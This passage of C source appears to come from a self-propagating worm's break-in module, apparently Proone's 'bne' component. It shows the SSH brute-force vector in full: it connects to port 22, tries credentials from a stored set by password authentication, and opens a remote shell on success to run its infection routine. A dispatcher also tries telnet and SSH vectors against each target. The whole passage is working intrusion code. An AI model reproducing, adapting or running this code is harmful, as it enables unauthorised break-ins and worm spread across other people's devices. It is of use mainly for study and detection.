	const int reason,
	const char *desc)
{
	pth_event_t ev = NULL;

	if (vs->ss == NULL) {
		return;
	}

	bne_reset_timer(&ev, to);
	prne_lssh2_discon(vs->ss, vs->fd, reason, desc, "", ev);
	pth_event_free(ev, FALSE);
}

static void bne_vssh_drop_conn (bne_vssh_ctx_t *vs) {
	prne_shutdown(vs->fd, SHUT_RDWR);

	prne_free(vs->auth_list);
	vs->auth_list = NULL;
	prne_lssh2_free_session(vs->ss);
	vs->ss = NULL;
	prne_close(vs->fd);
	vs->fd = -1;
}

static bool bne_vssh_est_sshconn (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
	bool ret = false;
	uint8_t m_sa[prne_op_max(
		sizeof(struct sockaddr_in),
		sizeof(struct sockaddr_in6))];
	struct sockaddr_in *sa4;
	struct sockaddr_in6 *sa6;
	socklen_t sl;
	int af, f_ret;
	pth_event_t ev = NULL;
	const struct timespec *pause = NULL;

	if (vs->ss != NULL) {
		return true;
	}

	bne_reset_timer(&ev, &BNE_CONN_OP_TIMEOUT);
	while (vs->ports.size > 0 && pth_event_status(ev) != PTH_STATUS_OCCURRED) {
		bne_port_t *p = (bne_port_t*)vs->ports.head->element;

		if (pause != NULL) {
			pth_nanosleep(pause, NULL);
			pause = NULL;
		}

		bne_vssh_drop_conn(vs);
		p->attempt += 1;

		switch (ctx->param.subject.ver) {
		case PRNE_IPV_4:
			sl = sizeof(struct sockaddr_in);
			sa4 = (struct sockaddr_in*)m_sa;
			prne_memzero(m_sa, sl);

			sa4->sin_family = af = AF_INET;
			memcpy(&sa4->sin_addr, ctx->param.subject.addr, 4);
			sa4->sin_port = htons(p->port);
			break;
		case PRNE_IPV_6:
			sl = sizeof(struct sockaddr_in6);
			sa6 = (struct sockaddr_in6*)m_sa;
			prne_memzero(m_sa, sl);

			sa6->sin6_family = af = AF_INET6;
			memcpy(&sa6->sin6_addr, ctx->param.subject.addr, 16);
			sa6->sin6_port = htons(p->port);
			break;
		default: continue;
		}

		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne@%"PRIxPTR"\t: knocking %"PRIu16"\n",
				(uintptr_t)ctx,
				p->port);
		}

		if (!bne_do_connect(af, (struct sockaddr*)m_sa, sl, &vs->fd, ev)) {
			ctx->result.err = errno;
			goto END;
		}
		if (vs->fd < 0) {
			pause = &BNE_ERR_PAUSE;
			if (p->attempt >= BNE_CONN_ATTEMPT) {
				goto POP;
			}
			continue;
		}

		vs->ss = libssh2_session_init();
		if (vs->ss == NULL) {
			ctx->result.err = errno;
			goto END;
		}
		libssh2_session_set_blocking(vs->ss, 0);

		f_ret = prne_lssh2_handshake(vs->ss, vs->fd, ev);
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne@%"PRIxPTR"\t: handshake %d\n",
				(uintptr_t)ctx,
				f_ret);
		}
		if (f_ret == 0) {
			ctx->result.err = 0;
			ret = true;
			break;
		}
		/* fall-through */
POP:
		// try next port
		prne_free(p);
		prne_llist_erase(&vs->ports, vs->ports.head);
	}

END:
	if (ev != NULL) {
		if (pth_event_status(ev) != PTH_STATUS_OCCURRED) {
			ctx->result.err = ETIMEDOUT;
		}
		pth_event_free(ev, FALSE);
	}
	if (!ret) {
		bne_vssh_drop_conn(vs);
	}

	return ret;
}

static bool bne_vssh_login (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
	bool ret = false;
	pth_event_t ev = NULL;
	int f_ret;

	while (true) {
		if (!bne_vssh_est_sshconn(ctx, vs)) {
			break;
		}

		if (ctx->result.cred.id == NULL || ctx->result.cred.pw == NULL) {
			if (!bne_pop_cred(ctx, true)) {
				break;
			}
			if (ctx->result.cred.id == NULL) {
				// have to try different ID
				bne_vssh_discon(
					vs,
					&BNE_CLOSE_OP_TIMEOUT,
					SSH_DISCONNECT_BY_APPLICATION,
					"this ain't over!");
				bne_vssh_drop_conn(vs);
				continue;
			}
		}

		bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
		if (vs->auth_list == NULL) {
			const char *tmp = prne_lssh2_ua_list(
				vs->ss,
				vs->fd,
				ctx->result.cred.id,
				ev,
				NULL);

			if (tmp != NULL) {
				const size_t len = strlen(tmp);

				vs->auth_list = prne_alloc_str(len);
				if (vs->auth_list == NULL) {
					ctx->result.err = errno;
					break;
				}
				memcpy(vs->auth_list, tmp, len + 1);
				prne_transstr(vs->auth_list, tolower);
			}
			else if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
				break;
			}
		}

		f_ret = prne_lssh2_ua_authd(vs->ss, vs->fd, ev);
		if (f_ret < 0) {
			bne_vssh_drop_conn(vs);
			if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
				break;
			}
			continue;
		}

		if (f_ret == 0) {
			// need auth
			// check vs->auth_list maybe?
			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
				prne_dbgpf(
					"bne@%"PRIxPTR"\t: trying cred %s %s\n",
					(uintptr_t)ctx,
					ctx->result.cred.id,
					ctx->result.cred.pw);
			}

			f_ret = prne_lssh2_ua_pwd(
				vs->ss,
				vs->fd,
				ctx->result.cred.id,
				ctx->result.cred.pw,
				ev);
			if (f_ret == LIBSSH2_ERROR_AUTHENTICATION_FAILED) {
/*
* server's not accepting the credentials that had been used for the
* first time
*/
				prne_free(ctx->result.cred.pw);
				ctx->result.cred.pw = NULL;
				continue;
			}
			if (f_ret != 0) {
				bne_vssh_drop_conn(vs);
				if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
					break;
				}
				continue;
			}
		}

		// after auth, acquire shell
		do { // FAKE LOOP
			vs->ch_shell = prne_lssh2_open_ch(
				vs->ss,
				vs->fd,
				ev,
				NULL);
			if (vs->ch_shell == NULL) {
				break;
			}
#if 0 // without terminal
			if (prne_lssh2_ch_req_pty(
				vs->ss,
				vs->ch_shell,
				vs->fd,
				"vanilla",
				ev))
			{
				break;
			}
#endif
			if (prne_lssh2_ch_sh(vs->ss, vs->ch_shell, vs->fd, ev)) {
				break;
			}

			ret = true;
			ctx->result.err = 0;
		} while (false);

		if (!ret) {
			if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
				break;
			}
			// credential worked, but could not open shell with this account
			bne_delete_cred_w_id(ctx, ctx->result.cred.id);
			bne_free_result_cred(ctx);
			bne_vssh_discon(
				vs,
				&BNE_CLOSE_OP_TIMEOUT,
				SSH_DISCONNECT_BY_APPLICATION,
				"this ain't over!");
			bne_vssh_drop_conn(vs);
			continue;
		}
		break;
	}

	pth_event_free(ev, FALSE);
	return ret;
}

static ssize_t bne_vssh_read_f (
	void *ctx_p,
	void *buf_p,
	const size_t buf_size,
	pth_event_t ev)
{
	bne_vssh_ctx_t *ctx = (bne_vssh_ctx_t*)ctx_p;
	size_t rem_size = buf_size;
	ssize_t ret = 0, f_ret;
	char *buf = (char*)buf_p;
	bool eof[2] = { false, false };
	int tmp;
	struct pollfd pfd;

	pfd.fd = ctx->fd;
	while (true) {
		f_ret = libssh2_channel_read_stderr(
			ctx->ch_shell,
			buf,
			rem_size);
		if (f_ret < 0) {
			if (f_ret != LIBSSH2_ERROR_EAGAIN) {
				ret = -1;
				break;
			}
		}
		else if (f_ret > 0) {
			ret += f_ret;
			buf += f_ret;
			rem_size -= f_ret;
		}
		else {
			eof[0] = true;
		}

		if (ret > 0) {
			break;
		}

		f_ret = libssh2_channel_read(
			ctx->ch_shell,
			buf,
			rem_size);
		if (f_ret < 0) {
			if (f_ret != LIBSSH2_ERROR_EAGAIN) {
				ret = -1;
				break;
			}
		}
		else if (f_ret > 0) {
			ret += f_ret;
			buf += f_ret;
			rem_size -= f_ret;
		}
		else {
			eof[1] = true;
		}

		if (ret > 0 || (eof[0] && eof[1])) {
			break;
		}

		tmp = libssh2_session_block_directions(ctx->ss);
		pfd.events = 0;
		if (tmp & LIBSSH2_SESSION_BLOCK_INBOUND) {
			pfd.events |= POLLIN;
		}
		if (tmp & LIBSSH2_SESSION_BLOCK_OUTBOUND) {
			pfd.events |= POLLOUT;
		}

		tmp = prne_pth_poll(&pfd, 1, -1, ev);
		if (tmp <= 0) {
			ret = -1;
			break;
		}
	}

	return ret;
}

static ssize_t bne_vssh_write_f (
	void *ctx_p,
	const void *buf_p,
	const size_t buf_size,
	pth_event_t ev)
{
	bne_vssh_ctx_t *ctx = (bne_vssh_ctx_t*)ctx_p;
	return prne_lssh2_ch_write(
		ctx->ss,
		ctx->ch_shell,
		ctx->fd,
		buf_p,
		buf_size,
		ev);
}

static bool bne_vssh_do_shell (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
	bne_sh_ctx_t sh_ctx;
	bool ret;

	bne_init_sh_ctx(&sh_ctx);
	sh_ctx.ctx = vs;
	sh_ctx.read_f = bne_vssh_read_f;
	sh_ctx.write_f = bne_vssh_write_f;

	// TODO: try exec cat command on a separate channel, write() binary directly
	ret = bne_do_shell(ctx, &sh_ctx);

	bne_free_sh_ctx(&sh_ctx);
	return ret;
}

static bool bne_do_vec_ssh (prne_bne_t *ctx) {
	static const uint16_t SSH_PORTS[] = { 22 };
	bool ret = false;
	bne_vssh_ctx_t vssh_ctx;

	prne_memzero(&vssh_ctx, sizeof(bne_vssh_ctx_t));
	vssh_ctx.fd = -1;
	prne_init_llist(&vssh_ctx.ports);

	bne_free_result_cred(ctx);

	for (size_t i = 0; i < sizeof(SSH_PORTS)/sizeof(uint16_t); i += 1) {
		bne_port_t *p = prne_calloc(sizeof(bne_port_t), 1);

		if (p == NULL) {
			ctx->result.err = errno;
			goto END;
		}
		p->port = SSH_PORTS[i];

		if (!prne_llist_append(
			&vssh_ctx.ports,
			(prne_llist_element_t)p))
		{
			prne_free(p);
			ctx->result.err = errno;
			goto END;
		}
	}

	if (!bne_build_cred_set(ctx)) {
		ctx->result.err = errno;
		goto END;
	}

	if (!bne_vssh_login(ctx, &vssh_ctx)) {
		goto END;
	}

	// `ctx->result.cred` must be set at this point
	if (vssh_ctx.ch_shell != NULL) {
		ret = bne_vssh_do_shell(ctx, &vssh_ctx);

		if (ret) {
			pth_event_t ev = NULL;

			bne_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
			// close the channel and wait for the remote end to do the same
			// this ensures that the issued commands are completed
			prne_lssh2_close_ch(
				vssh_ctx.ss,
				vssh_ctx.ch_shell,
				vssh_ctx.fd,
				ev);
			prne_lssh2_ch_wait_closed(
				vssh_ctx.ss,
				vssh_ctx.ch_shell,
				vssh_ctx.fd,
				ev);

			pth_event_free(ev, FALSE);
		}
	}

END:
	bne_vssh_discon(
		&vssh_ctx,
		&BNE_CLOSE_OP_TIMEOUT,
		SSH_DISCONNECT_BY_APPLICATION,
		"thank you");
	bne_vssh_drop_conn(&vssh_ctx);
	for (prne_llist_entry_t *e = vssh_ctx.ports.head; e != NULL; e = e->next) {
		prne_free((void*)e->element);
	}
	prne_free_llist(&vssh_ctx.ports);
	return ret;
}

/*******************************************************************************
                                  Extern Impl
*******************************************************************************/
static void bne_free_ctx_f (void *p) {
	prne_bne_t *ctx = (prne_bne_t*)p;

	if (ctx == NULL) {
		return;
	}

	prne_free_iset(&ctx->cred_set);
	prne_free_rnd(&ctx->rnd);
	prne_free_bne_param(&ctx->param);
	bne_free_result_cred(ctx);
	prne_free(ctx);
}

static void bne_fin_f (void *p) {
	// do nothing
}

static void *bne_entry_f (void *p) {
	prne_bne_t *ctx = (prne_bne_t*)p;
	bool f_ret;

	for (size_t i = 0; i < ctx->param.vector.cnt; i += 1) {
		switch (ctx->param.vector.arr[i]) {
		case PRNE_BNE_V_BRUTE_TELNET:
			f_ret = bne_do_vec_telnet(ctx);
			break;
		case PRNE_BNE_V_BRUTE_SSH:
			f_ret = bne_do_vec_ssh(ctx);
			break;
		}

		if (f_ret) {
			ctx->result.vec = ctx->param.vector.arr[i];
			break;
		}
	}

	return &ctx->result;
}

void prne_init_bne_param (prne_bne_param_t *p) {
	prne_memzero(p, sizeof(prne_bne_param_t));
	p->rcb.self = PRNE_ARCH_NONE;
}

void prne_free_bne_param (prne_bne_param_t *p) {}

const char *prne_bne_vector_tostr (const prne_bne_vector_t v) {
	switch (v) {
	case PRNE_BNE_V_BRUTE_TELNET: return "telnet";
	case PRNE_BNE_V_BRUTE_SSH: return "ssh";
	}
	return NULL;
}

prne_bne_t *prne_alloc_bne (
	prne_worker_t *w,
	mbedtls_ctr_drbg_context *ctr_drbg,
	const prne_bne_param_t *param)
{
	prne_bne_t *ret = NULL;
	uint8_t seed[PRNE_RND_WELL512_SEEDLEN];

	if (ctr_drbg == NULL || param->cb.exec_name == NULL) {
		errno = EINVAL;
		return NULL;
	}

// TRY
	ret = (prne_bne_t*)prne_calloc(sizeof(prne_bne_t), 1);
	if (ret == NULL) {
		goto ERR;
	}
	prne_init_iset(&ret->cred_set);
	prne_init_bne_param(&ret->param);
	prne_init_rnd(&ret->rnd);

	if (mbedtls_ctr_drbg_random(ctr_drbg, seed, sizeof(seed)) != 0) {
		goto ERR;
	}
	if (!prne_rnd_alloc_well512(&ret->rnd, seed)) {
		goto ERR;
	}

	ret->param = *param;

	ret->result.subject = &ret->param.subject;
	ret->result.vec = PRNE_BNE_V_NONE;
	ret->result.prc = PRNE_PACK_RC_OK;
	ret->result.arch = PRNE_ARCH_NONE;

	w->ctx = ret;
	w->entry = bne_entry_f;
	w->fin = bne_fin_f;
	w->free_ctx = bne_free_ctx_f;
	return ret;
ERR: // CATCH
	if (ret != NULL) {
		bne_free_ctx_f(ret);
		ret = NULL;
	}

	return NULL;
}
